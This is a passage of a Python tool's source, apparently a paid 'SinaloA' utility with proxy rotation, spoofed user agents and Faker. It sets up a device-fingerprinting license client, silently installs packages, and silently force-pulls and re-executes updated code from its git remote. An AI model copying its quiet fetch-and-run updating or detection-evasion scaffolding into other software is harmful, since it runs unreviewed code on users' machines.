from __future__ import annotations
from dataclasses import dataclass
from urllib import request, error
import asyncio
import aiohttp
import aiofiles
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from aiohttp_socks import ProxyConnector
from asyncio import Semaphore
import socket
from pyfiglet import figlet_format
import os
import ssl
import http.client
import asyncio
import aiohttp
import random
import uuid
import string
import sys
import time
import re
import importlib
from faker import Faker
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
import requests
from itertools import cycle
from collections import defaultdict
import threading
from datetime import datetime, date
import json
import platform, hashlib, dataclasses, httpx, getpass, locale, psutil, base64
import ctypes, subprocess
from colorama import Style, Fore
from colorama import init as _cinit, Fore as F, Style as S
from typing import Optional, Iterable, Dict, Any, Tuple, List, Callable, cast

_cinit(autoreset=True)


CONCURRENT_REQUESTS = 10
MAX_RETRIES = 5
PROXY_VALIDATION_THREADS = 75
PROXY_TIMEOUT = 20

LIVE_PROXIES = []
PROXY_CYCLE = cycle([None])

RED = "\033[91m"
YELLOW = "\033[33m"
WHITE = "\033[37m"
GREEN = "\033[92m"
BLACK = "\033[30m"
RESET = "\033[0m"
CYAN = "\033[36m"
BOLD = "\033[1m"
ITALIC = "\033[3m"

try:
    import pyfiglet, asyncio, aiohttp, colorama, faker
except ImportError:
    os.system(
        "pip install requests asyncio aiohttp aiofiles aiohttp_socks faker colorama pyfiglet pycryptodome &> /dev//null"
    )
    print("\nRun again this tools\n")
    sys.exit()

USERAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
]


GIST_RAW = "https://gist.githubusercontent.com/moomerman/1240682/raw/f72191b751eb2600a33abe3cfc813b1f1de5ab1a/ua.txt"

UserAgents2: list[str] = []


def _i(p):
    subprocess.run(
        [sys.executable, "-m", "pip", "install", p],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def _m(m, p=None):
    try:
        return importlib.import_module(m)
    except:
        _i(p or m)
        return importlib.import_module(m)


colorama = _m("colorama")
colorama.init(autoreset=True)
from colorama import Fore, Style

requests = _m("requests")
socketio = _m("socketio")


def col(t, c):
    return f"{c}{t}{Style.RESET_ALL}"


LINFO = {}


class Spin:
    def __init__(self, t="Processing"):
        self.t = t
        self.r = False

    def start(self):
        self.r = True
        threading.Thread(target=self._d, daemon=True).start()

    def stop(self):
        self.r = False
        print("\r" + " " * 60 + "\r", end="", flush=True)

    def _d(self):
        dots = [" .", " ..", " ...", " ...."]
        i = 0
        while self.r:
            print(f"\r{self.t}{dots[i]}", end="", flush=True)
            time.sleep(0.6)
            i = (i + 1) % 4


class Lic:
    @staticmethod
    def show_full():
        print(
            col(
                f"┌──────────── {Fore.BLUE}LICENSE INFO{Fore.WHITE} ───────────┐",
                Fore.WHITE,
            )
        )
        print(
            col(f"  Name     {Fore.RED}:", Fore.YELLOW),
            col(LINFO.get("name", "-"), Fore.WHITE),
        )
        print(
            col(f"  Expired  {Fore.RED}:", Fore.YELLOW),
            col(LINFO.get("expires", "-"), Fore.WHITE),
        )
        st = LINFO.get("status", "-")
        cst = Fore.GREEN if str(st).lower() == "active" else Fore.RED
        print(col(f"  Status   {Fore.RED}:", Fore.YELLOW), col(st, cst))
        print(
            col(f"  Device   {Fore.RED}:", Fore.YELLOW),
            col(LINFO.get("device", "-"), Fore.WHITE),
        )
        print(
            col(f"  User log {Fore.RED}:", Fore.YELLOW),
            col(LINFO.get("device_count", "-"), Fore.WHITE),
        )
        print(col("└─────────────────────────────────────┘", Fore.WHITE))

    @staticmethod
    def show_brief():
        print(
            col("License :", Fore.YELLOW),
            col(LINFO.get("name", "-"), Fore.LIGHTWHITE_EX),
        )
        st = LINFO.get("status", "-")
        cst = Fore.GREEN if str(st).lower() == "active" else Fore.RED
        print(col("Status  :", Fore.YELLOW), col(st, cst))
        print(
            col("Expires :", Fore.YELLOW),
            col(LINFO.get("expires", "-"), Fore.LIGHTWHITE_EX),
        )


class Client:
    def __init__(self, url, label):
        self.url = url.rstrip("/")
        self.label = label
        self.cache = os.path.join(os.path.expanduser("~"), ".lc_cache.json")
        self.key = None
        self.did = self._did()
        self.sio = None
        self.run = True

    def _pf(self):
        x = platform.system().lower()
        if "win" in x:
            return "WIN"
        if "darwin" in x:
            return "MAC"
        if "android" in x:
            return "DROID"
        return "LINUX"

    def _uid(self):
        r = "::".join(
            [
                hex(uuid.getnode()),
                socket.gethostname(),
                platform.system(),
                platform.machine(),
            ]
        )
        return hashlib.sha1(r.encode()).hexdigest()[:20].upper()

    def _nonce(self):
        try:
            data = json.load(open(self.cache))
        except:
            data = {}

        if "nonce" not in data:
            data["nonce"] = uuid.uuid4().hex[:12].upper()
            json.dump(data, open(self.cache, "w"))

        return data["nonce"]

    def _did(self):
        base = f"{self._uid()}::{self._nonce()}"
        return f"{self._pf()}-{hashlib.sha1(base.encode()).hexdigest()[:20].upper()}"

    def _rc(self):
        try:
            return json.load(open(self.cache))
        except:
            return {}

    def _sk(self, key):
        d = self._rc()
        d.setdefault("licenses", {})[self.label] = key
        json.dump(d, open(self.cache, "w"))

    def _lk(self):
        return self._rc().get("licenses", {}).get(self.label)

    def _dk(self):
        d = self._rc()
        if "licenses" in d and self.label in d["licenses"]:
            del d["licenses"][self.label]
            json.dump(d, open(self.cache, "w"))

    def _req(self, key):
        try:
            r = requests.post(
                f"{self.url}/api/verify",
                json={"key": key, "label": self.label, "device_id": self.did},
                timeout=8,
            )
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return {"valid": False, "error": str(e)}

    def _ver(self, key):
        sp = Spin("Verifying")
        sp.start()
        r = self._req(key)
        sp.stop()
        return r

    def _up(self):
        try:
            from pathlib import Path

            d = Path(__file__).resolve().parent
            os.chdir(d)
            subprocess.run(
                ["git", "fetch", "origin"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            lh = subprocess.check_output(["git", "rev-parse", "HEAD"]).strip()
            rh = subprocess.check_output(["git", "rev-parse", "origin/main"]).strip()
            if lh != rh:
                subprocess.run(
                    ["git", "reset", "--hard", "origin/main"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                subprocess.run(
                    ["git", "pull", "--force"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception:
            pass

    def _bye(self, title, msg):
        try:
            self.run = False
            if self.sio:
                try:
                    self.sio.disconnect()
                except:
                    pass
            self._dk()
        except:
            pass

        print()
        print(col(f"{title}", Fore.RED))
        print(col(f"{msg}", Fore.WHITE))
        print()
        os._exit(0)

    def _set_info(self, data):
        LINFO.clear()
        LINFO["name"] = data.get("name", "-")
        LINFO["expires"] = data.get("expires", "-")
        LINFO["status"] = data.get("status", "-")
        LINFO["device"] = self.did
        cur = int(data.get("current_log", 0))
        maxl = int(data.get("max_log", 0))
        LINFO["user_log"] = f"{cur}/{maxl}"

    # ==========================
    # REALTIME SOCKET MANAGER
    # ==========================
    def _rt(self):
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            logger=False,
            engineio_logger=False,
        )

        @self.sio.on("connect")
        def _connect():
            pass

        @self.sio.on("device_kicked")
        def on_device_kicked(payload):
            if payload.get("device") == self.did:
                os.system("cls" if os.name == "nt" else "clear")
                reason = payload.get("reason", "You have been kicked by admin.")
                self._bye("Kicked", reason)

        @self.sio.on("device_kicked_target")
        def on_device_kicked_target(payload):
            if payload.get("device_id") == self.did:
                os.system("cls" if os.name == "nt" else "clear")
                msg = payload.get("info", "You have been kicked by admin.")
                self._bye("Kicked", msg)

        @self.sio.on("license_disabled")
        def on_license_disabled(payload):
            key = payload.get("license_key") or payload.get("license")
            if key == self.key:
                os.system("cls" if os.name == "nt" else "clear")
                self._bye(
                    "License Disabled", "Your license has been disabled by admin."
                )

        @self.sio.on("license_expired")
        def on_license_expired(payload):
            key = payload.get("license_key") or payload.get("license")
            if key == self.key:
                os.system("cls" if os.name == "nt" else "clear")
                self._bye("License Expired", "Your license has expired.")

        @self.sio.on("license_deleted")
        def on_license_deleted(payload):
            key = payload.get("license_key") or payload.get("license")
            if key == self.key:
                os.system("cls" if os.name == "nt" else "clear")
                msg = payload.get("info", "Your license has been removed by admin.")
                self._bye("License Deleted", msg)

        @self.sio.on("device_limit")
        def on_device_limit(payload):
            if (
                payload.get("device") == self.did
                or payload.get("device_id") == self.did
            ):
                os.system("cls" if os.name == "nt" else "clear")
                msg = payload.get("info", "Device removed due to device limit.")
                self._bye("Kicked", msg)

        try:
            self.sio.connect(
                self.url,
                namespaces=["/"],
                socketio_path="socket.io",
                transports=["polling", "websocket"],
                wait_timeout=20,
            )
            self.sio.wait()
        except Exception as e:
            print(col(f"Socket connect failed: {e}", Fore.RED))

    def verify(self):
        def clear():
            os.system("cls" if os.name == "nt" else "clear")

        def header(title):
            clear()
            print(col("┌──────────────────────────────────────────┐", Fore.WHITE))
            print(col(f"│  {title.center(38)}  │", Fore.WHITE))
            print(col("└──────────────────────────────────────────┘\n", Fore.WHITE))

        header("LICENSE VERIFICATION")
        print(col("Device ID:", Fore.YELLOW), col(self.did, Fore.WHITE))

        # TRY CACHE
        cached = self._lk()
        if cached:
            print(col("Using cached license...", Fore.WHITE))
            r = self._ver(cached)

            if r.get("valid"):
                self.key = cached
                self._set_info(r)
                threading.Thread(target=self._rt, daemon=True).start()
                clear()
                return LINFO

            print(col("Cached license invalid — clearing cache.\n", Fore.RED))
            self._dk()
            time.sleep(1)
            header("LICENSE VERIFICATION")

        while True:
            print(
                col("Don't have a license? Telegram:", Fore.YELLOW),
                col("@xqndrs", Fore.WHITE),
            )
            print(f"Product: {col(self.label, Fore.GREEN)}")
            print("-" * 40)

            key = (
                input(
                    f"{Fore.RED}[!] {Fore.YELLOW}Enter License Key:{Style.RESET_ALL} "
                )
                .strip()
                .upper()
            )

            if not key:
                print(col("License cannot be empty.\n", Fore.RED))
                continue

            print()
            print(col("Validating license...\n", Fore.WHITE))
            r = self._ver(key)

            if r.get("valid"):
                self.key = key
                self._sk(key)
                self._set_info(r)
                threading.Thread(target=self._rt, daemon=True).start()
                clear()
                return LINFO

            err_msg = r.get("error") or "Invalid license."
            print(col(f"ERROR: {err_msg}\n", Fore.RED))
            time.sleep(3)
            header("LICENSE VERIFICATION")


LOGO = f"""{Fore.BLUE}
 .d8888b.  d8b                   888                 d8888 
d88P  Y88b Y8P                   888                d88888 
Y88b.                            888               d88P888 
 "Y888b.   888 88888b.   8888b.  888  .d88b.      d88P 888 
    "Y88b. 888 888 "88b     "88b 888 d88""88b    d88P  888 
      "888 888 888  888 .d888888 888 888  888   d88P   888 
Y88b  d88P 888 888  888 888  888 888 Y88..88P  d8888888888 
 "Y8888P"  888 888  888 "Y888888 888  "Y88P"  d88P     888 
 
        {Fore.YELLOW}version {Fore.RED}2.1.2 {Fore.YELLOW}| {Fore.WHITE}{ITALIC}KIANSANTANG {Fore.RED}DEV{RESET}"""


async def load_user_agents() -> list[str]:
    global UserAgents2
    timeout = aiohttp.ClientTimeout(10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(GIST_RAW) as resp:
            text = await resp.text(encoding="utf-8")  # Konversi ke UTF-8

    lines = [line.strip() for line in text.splitlines()]
    uas = [ua for ua in lines if ua and not ua.startswith("#")]
    UserAgents2 = uas
    return uas


async def random_user_agent() -> str:
    global UserAgents2
    if not UserAgents2:
        await load_user_agents()

    if not UserAgents2:
        raise RuntimeError("No user‑agent strings loaded.")

    return random.choice(UserAgents2)


def getstr_basic(text: str, prefix: str, suffix: str) -> str:
    start = text.find(prefix)
    if start == -1:
        return ""
    start += len(prefix)
    end = text.find(suffix, start)
    return text[start:end] if end != -1 else ""


try:
    from colorama import Fore, Style

    try:
        # aktifkan konversi ANSI di Windows bila tersedia
        from colorama import just_fix_windows_console

        just_fix_windows_console()
    except Exception:
        pass
    RESET = Style.RESET_ALL
except Exception:

    class _Dummy:
        def __getattr__(self, _):
            return ""

    Fore = _Dummy()
    RESET = ""


# --- Windows: aktifkan mode VT agar ANSI aman di cmd/PowerShell
def _enable_vt_if_possible():
    if os.name != "nt":
        return
    try:
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        STD_OUTPUT_HANDLE = -11
        STD_INPUT_HANDLE = -10
        ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        ENABLE_PROCESSED_OUTPUT = 0x0001
        ENABLE_VIRTUAL_TERMINAL_INPUT = 0x0200

        def _set_mode(handle_id, add_flags):
            h = kernel32.GetStdHandle(handle_id)
            mode = wintypes.DWORD()
            if not kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                return
            new_mode = mode.value | add_flags
            if new_mode != mode.value:
                kernel32.SetConsoleMode(h, new_mode)

        _set_mode(
            STD_OUTPUT_HANDLE,
            ENABLE_VIRTUAL_TERMINAL_PROCESSING | ENABLE_PROCESSED_OUTPUT,
        )
        _set_mode(STD_INPUT_HANDLE, ENABLE_VIRTUAL_TERMINAL_INPUT)
    except Exception:
        # diamkan jika tidak didukung
        pass


_enable_vt_if_possible()

_STDOUT_LOCK = threading.Lock()


def _safe_write(s: str) -> None:
    with _STDOUT_LOCK:
        sys.stdout.write(s)
        sys.stdout.flush()


class AsyncCounters:
    def __init__(self):
        self._lock = asyncio.Lock()
        self._data = defaultdict(int)

    async def increment(self, key: str):
        async with self._lock:
            self._data[key.upper()] += 1

    async def snapshot(self):
        async with self._lock:
            return dict(self._data)


# ---------- Util: Dapatkan posisi kursor absolut ----------
def _get_cursor_pos():
    try:
        if os.name == "nt":
            import ctypes
            from ctypes import wintypes

            class CONSOLE_SCREEN_BUFFER_INFO(ctypes.Structure):
                _fields_ = [
                    ("dwSize", wintypes._COORD),
                    ("dwCursorPosition", wintypes._COORD),
                    ("wAttributes", wintypes.WORD),
                    ("srWindow", wintypes.SMALL_RECT),
                    ("dwMaximumWindowSize", wintypes._COORD),
                ]

            h = ctypes.windll.kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            csbi = CONSOLE_SCREEN_BUFFER_INFO()
            if ctypes.windll.kernel32.GetConsoleScreenBufferInfo(h, ctypes.byref(csbi)):
                # Convert 0-based to 1-based
                return csbi.dwCursorPosition.Y + 1, csbi.dwCursorPosition.X + 1
            return None, None
        else:
            import termios, tty, select

            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setcbreak(fd)
                sys.stdout.write("\033[6n")  # query cursor pos
                sys.stdout.flush()
                # tunggu sampai ada balasan ESC [ row ; col R
                rlist, _, _ = select.select([sys.stdin], [], [], 0.2)
                if not rlist:
                    return None, None
                resp = ""
                while True:
